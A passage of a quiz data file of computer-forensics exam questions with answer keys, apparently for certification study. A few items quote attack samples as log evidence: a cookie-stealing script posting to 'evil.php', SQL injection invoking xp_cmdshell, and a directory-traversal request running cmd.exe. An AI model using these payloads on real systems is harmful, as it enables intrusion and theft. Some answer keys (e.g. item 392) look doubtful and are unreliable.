      "Robert is a regional manager working in a reputed organization. One day, he suspected malware attack after unwanted programs started to popup after logging into his computer. The network administrator was called upon to trace out any intrusion on the computer and he/she finds that suspicious activity has taken place within Autostart locations. In this situation, which of the following tools is used by the network administrator to detect any intrusion on a system?",
    options: [
      "Internet Evidence Finder",
      "Process Monitor",
      "Report Viewer",
      "Hex Editor",
    ],
    correctAnswer: 1,
  },
  {
    id: 365,
    question:
      "While collecting Active Transaction Logs using SQL Server Management Studio, the query Select * from ::fn_dblog(NULL, NULL) displays the active portion of the transaction log file. Here, assigning NULL values implies?",
    options: [
      "Start and end points for log sequence numbers are specified",
      "Start and end points for log files are not specified",
      "Start and end points for log sequence numbers are zero",
      "Start and end points for log files are zero",
    ],
    correctAnswer: 1,
  },
  {
    id: 366,
    question:
      "Which among the following acts has been passed by the U.S. Congress to protect investors from the possibility of fraudulent accounting activities by corporations?",
    options: [
      "Sarbanes-Oxley act of 2002",
      "Gramm-Leach-Bliley act",
      "Health Insurance Probability and Accountability act of 1996",
      "Federal Information Security Management act of 2002",
    ],
    correctAnswer: 0,
  },
  {
    id: 367,
    question:
      "Ronald, a forensic investigator, has been hired by a financial services organization to investigate an attack on their MySQL database server, which is hosted on a Windows machine named WIN-DTRAI83202X. Ronald wants to retrieve information on the changes that have been made to the database. Which of the following files should Ronald examine for this task?",
    options: [
      "WIN-DTRAI83202X-bin.nnnnnn",
      "relay-log.info",
      "WIN-DTRAI83202Xrelay-bin.index",
      "WIN-DTRAI83202Xslow.log",
    ],
    correctAnswer: 0,
  },
  {
    id: 368,
    question:
      "Edgar is part of the FBI's forensic media and malware analysis team; he is analyzing a current malware and is conducting a thorough examination of the suspect system, network, and other connected devices. Edgar's approach is to execute the malware code to know how it interacts with the host system and its impacts on it. He is also using a virtual machine and a sandbox environment. What type of malware analysis is Edgar performing?",
    options: [
      "Dynamic malware analysis/behavioral analysis",
      "VirusTotal analysis",
      "Static analysis",
      "Malware disassembly",
    ],
    correctAnswer: 0,
  },
  {
    id: 369,
    question:
      "When installed on a Windows machine, which port does the Tor browser use to establish a network connection via Tor nodes?",
    options: ["7680", "9150/9151", "49664/49665", "49667/49668"],
    correctAnswer: 1,
  },
  {
    id: 370,
    question:
      "The working of the Tor browser is based on which of the following concepts?",
    options: [
      "Onion routing.",
      "Static routing.",
      "Both static and default routing.",
      "Default routing.",
    ],
    correctAnswer: 0,
  },
  {
    id: 371,
    question:
      "Fred, a cybercrime investigator for the FBI, finished storing a solid-state drive in a static resistant bag and filled out the chain of custody form. Two days later, John grabbed the solid-state drive and created a clone of it (with write blockers enabled) in order to investigate the drive. He did not document the chain of custody though. When John was finished, he put the solid-state drive back in the static resistant and placed it back in the evidence locker. A day later, the court trial began and upon presenting the evidence and the supporting documents, the chief justice outright rejected them. Which of the following statements strongly support the reason for rejecting the evidence?",
    options: [
      "John did not document the chain of custody",
      "Block clones cannot be created with solid-state drives",
      "John investigated the clone instead of the original evidence itself",
      "Write blockers were used while cloning the evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 372,
    question:
      "When investigating a system, the forensics analyst discovers that malicious scripts were injected into benign and trusted websites. The attacker used a web application to send malicious code, in the form of a browser side script, to a different end-user. What attack was performed here?",
    options: [
      "Cross-site scripting attack",
      "SQL injection attack",
      "Cookie poisoning attack",
      "Brute-force attack",
    ],
    correctAnswer: 0,
  },
  {
    id: 373,
    question:
      "A breach resulted from a malware attack that evaded detection and compromised the machine memory without installing any software or accessing the hard drive. What technique did the adversaries use to deliver the attack?",
    options: ["Spyware", "JavaScript", "Trojan", "Fileless"],
    correctAnswer: 3,
  },
  {
    id: 374,
    question:
      "Which 'Standards and Criteria' under SWGDE states that 'the agency must use hardware and software that are appropriate and effective for the seizure or examination procedure'?",
    options: [
      "Standards and Criteria 1.6",
      "Standards and Criteria 1.5",
      "Standards and Criteria 1.4",
      "Standards and Criteria 1.7",
    ],
    correctAnswer: 1,
  },
  {
    id: 375,
    question:
      "You are the incident response manager at a regional bank. While performing routine auditing of web application logs, you find several attempted login submissions that contain the following strings:\n< SCRIPT type=\"text/javascript\" >\nvar adr = '../evil.php?cakemonster=' + escape(document.cookie);\n< /SCRIPT >\nWhat kind of attack has occurred?",
    options: [
      "Cross-site scripting",
      "Cross-site request forgery",
      "Buffer overflow",
      "SQL injection",
    ],
    correctAnswer: 0,
  },
  {
    id: 376,
    question:
      "Fill in the missing Master Boot Record component.\n1. Master boot code\n2. Partition table\n3. ____________",
    options: [
      "Signature word",
      "Volume boot record",
      "Disk signature",
      "Boot loader",
    ],
    correctAnswer: 2,
  },
  {
    id: 377,
    question:
      "Which of the following Windows event logs record events related to device drives and hardware changes?",
    options: [
      "Application log",
      "Security log",
      "Forwarded events log",
      "System log",
    ],
    correctAnswer: 3,
  },
  {
    id: 378,
    question:
      "Robert needs to copy an OS disk snapshot of a compromised VM to a storage account in different region for further investigation. Which of the following should he use in this scenario?",
    options: [
      "Azure Active Directory",
      "Azure Monitor",
      "Azure Portal",
      "Azure CLI",
    ],
    correctAnswer: 3,
  },
  {
    id: 379,
    question:
      "Which of the following tools will allow a forensic investigator to acquire the memory dump of a suspect machine so that it may be investigated on a forensic workstation to collect evidentiary data like processes and Tor browser artifacts?",
    options: [
      "Hex Editor",
      "Bulk Exactor",
      "DB Browser SQLite",
      "Belkasoft Live RAM Capturer and AccessData FTK Imager",
    ],
    correctAnswer: 3,
  },
  {
    id: 380,
    question:
      "An investigator is examining a file to identify any potentially malicious content. To avoid code execution and still be able to uncover hidden indicators of compromise (IOC), which type of examination should the investigator perform?",
    options: [
      "Threat analysis",
      "Static analysis",
      "Threat hunting",
      "Dynamic analysis",
    ],
    correctAnswer: 1,
  },
  {
    id: 381,
    question:
      "You are a digital forensic investigator at a large pharmaceutical company. You are responding to a security incident where you have found a computer on the scene, and you believe the computer contains evidence that is valuable to the case. The computer is running, but the screen is blank. What should you do first?",
    options: [
      "Gather the appropriate report forms, pens, and memory capture tools",
      "Unplug the computer",
      "Press a single key on the keyboard, and document which key was pressed",
      "Move the mouse slightly to wake the computer up",
    ],
    correctAnswer: 3,
  },
  {
    id: 382,
    question:
      "On NTFS file system, which of the following tools can a forensic investigator use in order to identify timestomping of evidence files?",
    options: ["analyzeMFT", "Exiv2", "Timestomp", "wbStego"],
    correctAnswer: 0,
  },
  {
    id: 383,
    question:
      "Which of the following Android libraries are used to render 2D (SGL) or 3D (OpenGL/ES) graphics content to the screen?",
    options: [
      "OpenGL/ES and SGL",
      "Webkit",
      "Surface Manager",
      "Media framework",
    ],
    correctAnswer: 0,
  },
  {
    id: 384,
    question:
      "Jacob is a computer forensics investigator with over 10 years experience in investigations and has written over 50 articles on computer forensics. He has been called upon as a qualified witness to testify the accuracy and integrity of the technical log files gathered in an investigation into computer fraud. What is the term used for Jacob's testimony in this case?",
    options: [
      "Justification",
      "Reiteration",
      "Authentication",
      "Certification",
    ],
    correctAnswer: 2,
  },
  {
    id: 385,
    question: "What does Locard's exchange Principle state?",
    options: [
      "Anyone, or anything, entering a crime scene takes something of the scene with them, and leaves something of themselves behind when they leave",
      "Any information of probative value that is either stored or transmitted in a digital form",
      "Digital evidence must have some characteristics to be disclosed in the court of law",
      "Forensic investigators face many challenges during forensics investigation of a digital crime, such as extracting, preserving, and analyzing the digital evidence",
    ],
    correctAnswer: 0,
  },
  {
    id: 386,
    question:
      "Which Linux command when executed displays kernel ring buffers or information about device drivers loaded into the kernel?",
    options: ["dmesg", "pgrep", "fsck", "grep"],
    correctAnswer: 0,
  },
  {
    id: 387,
    question:
      "A file requires 10 KB space to be saved on a hard disk partition. An entire cluster of 32 KB has been allocated for this file. The remaining, unused space of 22 KB on this cluster will be identified as _______",
    options: ["Cluster space", "Sector space", "Swap space", "Slack space"],
    correctAnswer: 3,
  },
  {
    id: 388,
    question:
      "One technique for hiding information is to change the file extension from the correct one to one that might not be noticed by an investigator. For example, changing a .jpg extension to a .doc extension so that a picture file appears to be a document. What can an investigator examine to verify that a file has the correct extension?",
    options: [
      "The sector map",
      "The File Allocation Table",
      "The file footer",
      "The file header",
    ],
    correctAnswer: 3,
  },
  {
    id: 389,
    question:
      "Identify the term that refers to individuals who, by virtue of their knowledge and expertise, express an independent opinion on a matter related to a case based on the information that is provided.",
    options: [
      "Defense witness",
      "Evidence examiner",
      "Forensic examiner",
      "Expert witness",
    ],
    correctAnswer: 3,
  },
  {
    id: 390,
    question:
      "After a successful data exfiltration attack against your organization, you are conducting an internal investigation and suspect a significant portion of evidence exists on an end-user’s personal laptop. You want to be sure not to tip-off the laptop’s owner that an investigation is being conducted. What is the best option to obtain the evidence?",
    options: [
      "Confiscate the laptop",
      "Request the laptop owner to voluntarily surrender it",
      "Obtain a search warrant",
      "Obtain a subpoena",
    ],
    correctAnswer: 2,
  },
  {
    id: 391,
    question:
      "In forensics, _________ are used to view stored or deleted data from both files and disk sectors.",
    options: [
      "Host interfaces",
      "SIEM tools",
      "Hex editors",
      "Hash algorithms",
    ],
    correctAnswer: 2,
  },
  {
    id: 392,
    question:
      "You are an information security analyst at a large pharmaceutical company. While performing a routine review of audit logs, you have noticed a significant amount of egress traffic to various IP addresses on destination port 22 during off-peak hours. You researched some of the IP addresses and found that many of them are in Eastern Europe. What is the most likely cause of this traffic?",
    options: [
      "Malicious software on internal system is downloading research data from partner SFTP servers in Eastern Europe",
      "Data is being exfiltrated by an advanced persistent threat (APT)",
      "The organization's primary internal DNS server has been compromised and is performing DNS zone transfers to malicious external entities",
      "Internal systems are downloading automatic Windows updates",
    ],
    correctAnswer: 0,
  },
  {
    id: 393,
    question:
      "What do you call the process of studying the changes that have taken place across a system or a machine after a series of actions or incidents?",
    options: [
      "Host integrity Monitoring",
      "System Baselining",
      "Start-up Programs Monitoring",
      "Windows Services Monitoring",
    ],
    correctAnswer: 0,
  },
  {
    id: 394,
    question:
      "This is a statement, other than one made by the declarant while testifying at the trial or hearing, offered in evidence to prove the truth of the matter asserted. Which among the following is suitable for the above statement?",
    options: [
      "Rule 1001",
      "Hearsay rule",
      "Testimony by the accused",
      "Limited admissibility",
    ],
    correctAnswer: 1,
  },
  {
    id: 395,
    question: "Data density of a disk drive is calculated by using _____.",
    options: [
      "Track space, bit area, and slack space.",
      "Slack space, bit density, and slack density.",
      "Track density, areal density, and slack density.",
      "Track density, areal density, and bit density.",
    ],
    correctAnswer: 3,
  },
  {
    id: 396,
    question:
      "For the purpose of preserving the evidentiary chain of custody, which of the following labels is not appropriate?",
    options: [
      "Relevant circumstances surrounding the collection",
      "Exact location the evidence was collected from",
      "General description of the evidence",
      "SSN of the person collecting the evidence",
    ],
    correctAnswer: 3,
  },
  {
    id: 397,
    question:
      "James, a hacker, identifies a vulnerability in a website. To exploit the vulnerability, he visits the login page and notes down the session ID that is created. He appends this session ID to the login URL and shares the link with a victim. Once the victim logs into the website using the shared URL, James reloads the webpage (containing the URL with the session ID appended) and now, he can browse the active session of the victim. Which attack did James successfully execute?",
    options: [
      "Session Fixation Attack",
      "Cookie Tampering",
      "Parameter Tampering",
      "Cross Site Request Forgery",
    ],
    correctAnswer: 0,
  },
  {
    id: 398,
    question:
      "Consider a scenario where a forensic investigator is performing malware analysis on a memory dump acquired from a victim's computer. The investigator uses Volatility Framework to analyze RAM contents: which plugin helps investigator to identify hidden processes or injected code/DLL in the memory dump?",
    options: ["mallist", "pslist", "malfind", "malscan"],
    correctAnswer: 2,
  },
  {
    id: 399,
    question:
      "Jacob, a cybercrime investigator, joined a forensics team to participate in a criminal case involving digital evidence. After the investigator collected all the evidence and presents it to the court, the judge dropped the case and the defense attorney pressed charges against Jacob and the rest of the forensics team for unlawful search and seizure. What forensics privacy issue was not addressed prior to collecting the evidence?",
    options: [
      "Compliance with the Fourth Amendment of the U.S. Constitution",
      "None of these",
      "Compliance with the Second Amendment of the U.S. Constitution",
      "Compliance with the Third Amendment of the U.S. Constitution",
    ],
    correctAnswer: 0,
  },
  {
    id: 400,
    question:
      'Consider that you are investigating a machine running an Windows OS released prior to Windows Vista. You are trying to gather information about the deleted files by examining the master database file named INFO2 located at C:\\Recycler\\<USER SID>\\. You read an entry named "Dd5.exe". What does Dd5.exe mean?',
    options: [
      "D drive. fifth file deleted, a .exe file",
      "D drive, fourth file restored, a .exe file",
      "D drive, fourth file deleted, a .exe file",
      "D drive, sixth file deleted, a .exe file",
    ],
    correctAnswer: 0,
  },
  {
    id: 401,
    question:
      "An investigator wants to extract passwords from SAM and System Files. Which tool can the investigator use to obtain a list of users, passwords, and their hashes in this case?",
    options: ["Nuix", "FileMerlin", "PWdump7", "HashKey"],
    correctAnswer: 2,
  },
  {
    id: 402,
    question:
      "Which of the following statements is true with respect to SSDs (solid-state drives)?",
    options: [
      "Faster data access, lower power usage, and higher reliability are some of the major advantages of SSDs over HDDs",
      "SSDs contain tracks, clusters, and sectors to store data",
      "Like HDDs, SSDs also have moving parts",
      "SSDs cannot store non-volatile data",
    ],
    correctAnswer: 0,
  },
  {
    id: 403,
    question:
      "Which cloud model allows an investigator to acquire the instance of a virtual machine and initiate the forensics examination process?",
    options: ["IaaS model", "SaaS model", "PaaS model", "SECaaS model"],
    correctAnswer: 0,
  },
  {
    id: 404,
    question:
      "Storage location of Recycle Bin for NTFS file systems (Windows Vista and later) is located at:",
    options: [
      "Drive:\\RECYCLER",
      "Drive:\\RECYCLED",
      "Drive:\\RECYCLE.BIN",
      "Drive:\\$Recycle.Bin",
    ],
    correctAnswer: 3,
  },
  {
    id: 405,
    question:
      "In Java, when multiple applications are launched, multiple Dalvik Virtual Machine instances occur that consume memory and time. To avoid that, Android implements a process that enables low memory consumption and quick start-up time. What is the process called?",
    options: ["Init", "Zygote", "Daemon", "Media server"],
    correctAnswer: 1,
  },
  {
    id: 406,
    question:
      "Which of the following attacks refers to unintentional download of malicious software via the Internet? Here, an attacker exploits flaws in browser software to install malware merely by the user visiting the malicious website.",
    options: [
      "Internet relay chats",
      "Phishing",
      "Drive-by downloads",
      "Malvertising",
    ],
    correctAnswer: 2,
  },
  {
    id: 407,
    question:
      "An EC2 instance storing critical data of a company got infected with malware. The forensics team took the EBS volume snapshot of the affected instance to perform further analysis and collected other data of evidentiary value. What should be their next step?",
    options: [
      "They should keep the instance running as it stores critical data",
      "They should terminate all instances connected via the same VPC",
      "They should pause the running instance",
      "They should terminate the instance after taking necessary backup",
    ],
    correctAnswer: 3,
  },
  {
    id: 408,
    question:
      "Cloud forensic investigations impose challenges related to multi-jurisdiction and multi-tenancy aspects. To have a better understanding of the roles and responsibilities between the cloud service provider (CSP) and the client, which document should the forensic investigator review?",
    options: [
      "National and local regulation",
      "Service level agreement",
      "Key performance indicator",
      "Service level management",
    ],
    correctAnswer: 1,
  },
  {
    id: 409,
    question:
      'William is examining a log entry that reads 192.168.0.1 - - [18/Jan/2020:12:42:29 +0000] "GET / HTTP/1.1" 200 1861. Which of the following logs does the log entry belong to?',
    options: [
      "Apache error log",
      "IIS log",
      "The combined log format of Apache access log",
      "The common log format of Apache access log",
    ],
    correctAnswer: 3,
  },
  {
    id: 410,
    question:
      "Adam is thinking of establishing a hospital in the US and approaches John, a software developer to build a site and host it for him on one of the servers, which would be used to store patient health records. He has learned from his legal advisors that he needs to have the server's log data reviewed and managed according to certain standards and regulations. Which of the following regulations are the legal advisors referring to?",
    options: [
      "Data Protection Act of 2018",
      "Health Insurance Portability and Accountability Act of 1996 (HIPAA)",
      "Electronic Communications Privacy Act",
      "Payment Card Industry Data Security Standard (PCI DSS)",
    ],
    correctAnswer: 1,
  },
  {
    id: 411,
    question:
      "The information security manager at a national legal firm has received several alerts from the intrusion detection system that a known attack signature was detected against the organization's file server. What should the information security manager do first?",
    options: [
      "Disconnect the file server from the network",
      "Update the anti-virus definitions on the file server",
      "Report the incident to senior management",
      "Manually investigate to verify that an incident has occurred",
    ],
    correctAnswer: 3,
  },
  {
    id: 412,
    question:
      "Which of the following Registry components include offsets to other cells as well as the LastWrite time for the key?",
    options: [
      "Key cell",
      "Value cell",
      "Value list cell",
      "Security descriptor cell",
    ],
    correctAnswer: 0,
  },
  {
    id: 413,
    question:
      "You are assigned a task to examine the log files pertaining to MyISAM storage engine. While examining, you are asked to perform a recovery operation on a MyISAM log file. Which among the following MySQL Utilities allow you to do so?",
    options: ["mysqldump", "myisamaccess", "myisamlog", "myisamchk"],
    correctAnswer: 2,
  },
  {
    id: 414,
    question:
      "Annie is searching for certain deleted files on a system running Windows XP OS. Where will she find the files if they were not completely deleted from the system?",
    options: [
      "C: $Recycled.Bin",
      "C:\\RECYCLER",
      "C:\\$Recycle.Bin",
      "C:\\$RECYCLER",
    ],
    correctAnswer: 1,
  },
  {
    id: 415,
    question:
      "Williamson is a forensic investigator. While investigating a case of data breach at a company, he is maintaining a document that records details such as the forensic processes applied on the collected evidence, particulars of people handling it, the dates and times when it is being handled, and the place of storage of the evidence. What do you call this document?",
    options: [
      "Chain of custody",
      "Authorization form",
      "Log book",
      "Consent form",
    ],
    correctAnswer: 0,
  },
  {
    id: 416,
    question:
      "Smith, an employee of a reputed forensic investigation firm, has been hired by a private organization to investigate a laptop that is suspected to be involved in the hacking of the organization's DC server. Smith wants to find all the values typed into the Run box in the Start menu. Which of the following registry keys will Smith check to find the above information?",
    options: [
      "RunMRU key",
      "MountedDevices key",
      "UserAssist Key",
      "TypedURLs key",
    ],
    correctAnswer: 0,
  },
  {
    id: 417,
    question:
      "Matthew has been assigned the task of analyzing a suspicious MS Office document via static analysis over an Ubuntu-based forensic machine. He wants to see what type of document it is, whether it is encrypted, or contains any flash objects/VBA macros. Which of the following python-based script should he run to get relevant information?",
    options: ["pdfid.py", "oleform.py", "oledir.py", "oleid.py"],
    correctAnswer: 3,
  },
  {
    id: 418,
    question:
      "Smith, a network administrator with a large MNC, was the first to arrive at a suspected crime scene involving criminal use of compromised computers. What should be his first response while maintaining the integrity of evidence?",
    options: [
      "Open the systems, remove the hard disk and secure it",
      "Record the system state by taking photographs of physical system and the display",
      "Switch-off the system and carry them to the laboratory",
      "Perform data acquisition without disturbing the state of the systems",
    ],
    correctAnswer: 1,
  },
  {
    id: 419,
    question:
      "Jacky encrypts her documents using a password. It is known that she uses her daughter's year of birth as part of the password. Which password cracking technique would be optimal to crack her password?",
    options: [
      "Hybrid attack",
      "Brute force attack",
      "Syllable attack",
      "Rule-based attack",
    ],
    correctAnswer: 3,
  },
  {
    id: 420,
    question:
      "Which set of anti-forensic tools/techniques allows a program to compress and/or encrypt an executable file to hide attack tools from being detected by reverse-engineering or scanning?",
    options: ["Emulators", "Botnets", "Parkers", "Password crackers"],
    correctAnswer: 2,
  },
  {
    id: 421,
    question:
      "What command-line tool enables forensic investigator to establish communication between an Android device and a forensic workstation in order to perform data acquisition from the device?",
    options: ["SDK Manager", "APK Analyzer", "Xcode", "Android Debug Bridge"],
    correctAnswer: 3,
  },
  {
    id: 422,
    question:
      "Which of the following statements pertaining to First Response is true?",
    options: [
      "First Response is part of the post-investigation phase",
      "First Response is neither a part of pre-investigation phase nor a part of investigation phase. It only involves attending to a crime scene first and taking measures that assist forensic investigators in executing their tasks in the investigation phase more effectively",
      "First Response is part of the investigation phase",
      "First Response is part of the pre-investigation phase",
    ],
    correctAnswer: 2,
  },
  {
    id: 423,
    question:
      "Which following forensic tool allows investigator to detect and extract hidden streams on NTFS drive?",
    options: ["Autopsy", "Stream Detector", "analyzeMFT", "TimeStomp"],
    correctAnswer: 1,
  },
  {
    id: 424,
    question:
      "Which of the following is the most effective tool for acquiring volatile data from a Windows-based system?",
    options: ["Coreography", "Datagrab", "Helix", "Ethereal"],
    correctAnswer: 2,
  },
  {
    id: 425,
    question:
      "During an investigation, the first responders stored mobile devices in specific containers to provide network isolation. All the following are examples of such pieces of equipment, except for:",
    options: [
      "Faraday bag",
      "Wireless StrongHold bag",
      "VirtualBox",
      "RF shield box",
    ],
    correctAnswer: 2,
  },
  {
    id: 427,
    question:
      "Place the following in order of volatility from most volatile to the least volatile.",
    options: [
      "Archival media, temporary file systems, disk storage, archival media, register and cache",
      "Register and cache, temporary file systems, routing tables, disk storage, archival media",
      "Registers and cache, routing tables, temporary file systems, archival media, disk storage",
      "Registers and cache, routing tables, temporary file systems, disk storage, archival media",
    ],
    correctAnswer: 3,
  },
  {
    id: 428,
    question:
      "Which Federal Rule of Evidence speaks about the Hearsay exception where the availability of the declarant is immaterial and certain characteristics of the declarant such as present sense impression, excited utterance, and recorded recollection are also observed while giving their testimony?",
    options: ["Rule 803", "Rule 804", "Rule 801", "Rule 802"],
    correctAnswer: 0,
  },
  {
    id: 429,
    question:
      "What is the extension used by Windows OS for shortcut files present on the machine?",
    options: [".lnk", ".dat", ".pdf", ".log"],
    correctAnswer: 0,
  },
  {
    id: 430,
    question:
      "An International Mobile Equipment Identifier (IMEI) is a 15-digit number that indicates the manufacturer, model type, and country of approval for GSM devices. The first eight digits of an IMEI number that provide information about the model and origin of the mobile device is also known as:",
    options: [
      "Type Allocation Code (TAC)",
      "Integrated Circuit Code (ICC)",
      "Manufacturer Identification Code (MIC)",
      "Device Origin Code (DOC)",
    ],
    correctAnswer: 0,
  },
  {
    id: 431,
    question:
      "BMP (Bitmap) is a standard file format for computers running the Windows operating system. BMP images can range from black and white (1 bit per pixel) up to 24 bit color (16.7 million colors). Each bitmap file contains a header, the RGBQUAD array, information header, and image data. Which of the following element specifies the dimensions, compression type, and color format for the bitmap?",
    options: [
      "Image data",
      "Information header",
      "The RGBQUAD array",
      "Header",
    ],
    correctAnswer: 1,
  },
  {
    id: 432,
    question:
      "Report writing is a crucial stage in the outcome of an investigation. Which information should not be included in the report section?",
    options: [
      "Purpose of the report",
      "Speculation or opinion as to the cause of the incident",
      "Incident summary",
      "Author of the report",
    ],
    correctAnswer: 1,
  },
  {
    id: 433,
    question:
      "Which among the following web application threats is resulted when developers expose various internal implementation objects, such as files, directories, database records, or key-through references?",
    options: [
      "Cross-Site scripting",
      "Insecure direct object references",
      "Cross-site request forgery",
      "Remote file inclusion",
    ],
    correctAnswer: 1,
  },
  {
    id: 434,
    question:
      "Which of the following Event Correlation Approach is an advanced correlation method that assumes and predicts what an attacker can do next after the attack by studying the statistics and probability and uses only two variables?",
    options: [
      "Rule-Based Approach",
      "Vulnerability-Based Approach",
      "Bayesian Correlation",
      "Route Correlation",
    ],
    correctAnswer: 2,
  },
  {
    id: 435,
    question:
      "A clothing company has recently deployed a website on its latest product line to increase its conversion rate and base of customers. Andrew, the network administrator recently appointed by the company, has been assigned with the task of protecting the website from intrusion and vulnerabilities. Which of the following tool should Andrew consider deploying in this scenario?",
    options: ["ModSecurity", "Recuva", "CryptaPix", "Kon-Boot"],
    correctAnswer: 0,
  },
  {
    id: 436,
    question:
      "Which ISO Standard enables laboratories to demonstrate that they comply with quality assurance and provide valid results?",
    options: [
      "ISO/IEC 17025",
      "ISO/IEC 18025",
      "ISO/IEC 16025",
      "ISO/IEC 19025",
    ],
    correctAnswer: 0,
  },
  {
    id: 437,
    question:
      "A forensic analyst has been tasked with investigating unusual network activity inside a retail company's network. Employees complain of not being able to access services, frequent rebooting, and anomalies in log files. The investigator requested log files from the IT administrator and after carefully reviewing them, he finds the following log entry:\n12:34:35 192.2.3.4 HEAD GET /login.asp?username=blah” or 1=1 –\n12:34:35 192.2.3.4 HEAD GET /login.asp?username=blah” or) 1=1 (--\n12:34:35 192.2.3.4 HEAD GET /login.asp?username+blah” or exec master..xp_cmdshell ‘net user test testpass--\nWhat type of attack was performed on the companies' web application?",
    options: [
      "Directory transversal",
      "SQL injection",
      "Unvalidated input",
      "Log tampering",
    ],
    correctAnswer: 1,
  },
  {
    id: 438,
    question:
      "Tony, an email marketing professional, is accused of enticing people to reveal their personal information such as banking credentials, credit card details, bank details, etc. via phishing emails. What type of investigation will apply to Tony’s case?",
    options: ["Civil", "None of these", "Administrative", "Criminal"],
    correctAnswer: 3,
  },
  {
    id: 439,
    question:
      "_____________ allows a forensic investigator to identify the missing links during investigation.",
    options: [
      "Chain of custody",
      "Exhibit numbering",
      "Evidence preservation",
      "Evidence reconstruction",
    ],
    correctAnswer: 3,
  },
  {
    id: 440,
    question:
      "Self-Monitoring, Analysis, and Reporting Technology (SMART) is built into the hard drives to monitor and report system activity. Which of the following is included in the report generated by SMART?",
    options: [
      "Power-off time",
      "All the states (running and discontinued) associated with the OS",
      "A log of high temperatures that the drive has reached",
      "List of running processes",
    ],
    correctAnswer: 2,
  },
  {
    id: 441,
    question:
      "Mark works for a government agency as a cyber-forensic investigator. He has been given the task of restoring data from a hard drive. The partition of the hard drive was deleted by a disgruntled employee in order to hide their nefarious actions. What tool should Mark use to restore the data?",
    options: ["EFSDump", "R-Studio", "Diskview", "Diskmon"],
    correctAnswer: 1,
  },
  {
    id: 442,
    question:
      "An investigator needs to perform data acquisition from a storage media without altering its contents to maintain the integrity of the content. The approach adopted by the investigator relies upon the capacity of enabling read-only access to the storage media. Which tool should the investigator integrate into his/her procedures to accomplish this task?",
    options: [
      "Data duplication tool",
      "Backup tool",
      "Bitlocker",
      "Write blocker",
    ],
    correctAnswer: 3,
  },
  {
    id: 443,
    question:
      "A call detail record (CDR) provides metadata about calls made over a phone service. From the following data fields, which one is not contained in a CDR.",
    options: [
      "A unique sequence number identifying the record",
      "The call duration",
      "Phone number receiving the call",
      "The language of the call",
    ],
    correctAnswer: 3,
  },
  {
    id: 444,
    question:
      "Which tool allows dumping the contents of process memory without stopping the process?",
    options: ["psdump.exe", "pmdump.exe", "processdump.exe", "pdump.exe"],
    correctAnswer: 1,
  },
  {
    id: 445,
    question:
      "Web browsers can store relevant information from user activities. Forensic investigators may retrieve files, lists, access history, cookies, among other digital footprints. Which tool can contribute to this task?",
    options: [
      "MZCacheView",
      "Google Chrome Recovery Utility",
      "Task Manager",
      "Most Recently Used (MRU) list",
    ],
    correctAnswer: 0,
  },
  {
    id: 446,
    question:
      "In exceptional circumstances, where a person finds it necessary to access original data held on a computer or on storage media, that person must be competent to do so and be able to explain his/her actions and the impact of those actions on the evidence, in the court. Which ACPO principle states this?",
    options: ["Principle 1", "Principle 2", "Principle 4", "Principle 3"],
    correctAnswer: 1,
  },
  {
    id: 447,
    question:
      "Which of the following tools is used dump the memory of a running process, either immediately or when an error condition occurs?",
    options: [
      "CacheInf",
      "Belkasoft Live RAM Capturer",
      "FATKit",
      "Coreography",
    ],
    correctAnswer: 1,
  },
  {
    id: 448,
    question:
      "POP3 is an internet protocol used to retrieve emails from a mail server. Through which port does an email client connect with a POP server?",
    options: ["25", "110", "993", "143"],
    correctAnswer: 1,
  },
  {
    id: 451,
    question:
      "Which of the following are small pieces of data sent from a website and stored on the user's computer by the user's web browser to track, validate, and maintain specific user information?",
    options: ["Temporary Files", "Open files", "Cookies", "Web Browser Cache"],
    correctAnswer: 2,
  },
  {
    id: 452,
    question:
      "Depending upon the jurisdictional areas, different laws apply to different incidents. Which of the following law is related to fraud and related activity in connection with computers?",
    options: ["18 USC §1029", "18 USC §1030", "18 USC §1361", "18 USC §1371"],
    correctAnswer: 1,
  },
  {
    id: 453,
    question:
      "Charles has accidentally deleted an important file while working on his Mac computer. He wants to recover the deleted file as it contains some of his crucial business secrets. Which of the following tool will help Charles?",
    options: ["Xplico", "Colasoft's Capsa", "FileSalvage", "DriveSpy"],
    correctAnswer: 2,
  },
  {
    id: 454,
    question:
      "Which of the following files stores information about a local Google Drive installation such as User email ID, Local Sync Root Path, and Client version installed?",
    options: ["filecache.db", "config.db", "sigstore.db", "Sync_config.db"],
    correctAnswer: 3,
  },
  {
    id: 455,
    question:
      "An expert witness is a __________________ who is normally appointed by a party to assist the formulation and preparation of a party's claim or defense.",
    options: [
      "Expert in criminal investigation",
      "Subject matter specialist",
      "Witness present at the crime scene",
      "Expert law graduate appointed by attorney",
    ],
    correctAnswer: 1,
  },
  {
    id: 456,
    question:
      "Which among the following is an act passed by the U.S. Congress in 2002 to protect investors from the possibility of fraudulent accounting activities by corporations?",
    options: ["FISMA", "HIPAA", "SOX", "GLBA"],
    correctAnswer: 2,
  },
  {
    id: 457,
    question:
      "Billy, a computer forensics expert, has recovered a large number of DBX files during the forensic investigation of a laptop. Which of the following email clients can he use to analyze the DBX files?",
    options: [
      "Microsoft Outlook",
      "Eudora",
      "Mozilla Thunderbird",
      "Microsoft Outlook Express",
    ],
    correctAnswer: 3,
  },
  {
    id: 458,
    question:
      "Identify the file system that uses $BitMap file to keep track of all used and unused clusters on a volume.",
    options: ["NTFS", "FAT", "EXT", "FAT32"],
    correctAnswer: 0,
  },
  {
    id: 459,
    question:
      "The Apache server saves diagnostic information and error messages that it encounters while processing requests. The default path of this file is usr/local/apache/logs/error.log in Linux. Identify the Apache error log from the following logs.",
    options: [
      "http://victim.com/scripts/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../.% c0%af../..%c0%af../winnt/system32/cmd.exe?/c+dir+C:\\Winnt\\system32\\Logfiles\\W3SVC1",
      "[Wed Oct 11 14:32:52 2000] [error] [client 127.0.0.1] client denied by server configuration:/export/home/live/ap/htdocs/test",
      '127.0.0.1 - frank [10/Oct/2000:13:55:36 -0700]"GET /apache_pb.gif HTTP/1.0" 200 2326',
      '127.0.0.1 - - [10/Apr/2007:10:39:11 +0300] ] [error] "GET /apache_pb.gif HTTP/1.0" 200 2326',
    ],
    correctAnswer: 1,
  },
  {
    id: 460,
    question:
      "Which part of Metasploit framework helps users to hide the data related to a previously deleted file or currently unused by the allocated file?",
    options: ["Wafen FS", "RuneFS", "FragFS", "Slacker"],
    correctAnswer: 3,
  },
  {
    id: 461,
    question:
      "Event correlation is the process of finding relevance between the events that produce a final result. What type of correlation will help an organization to correlate events across a set of servers, systems, router and network?",
    options: [
      "Same-platform correlation",
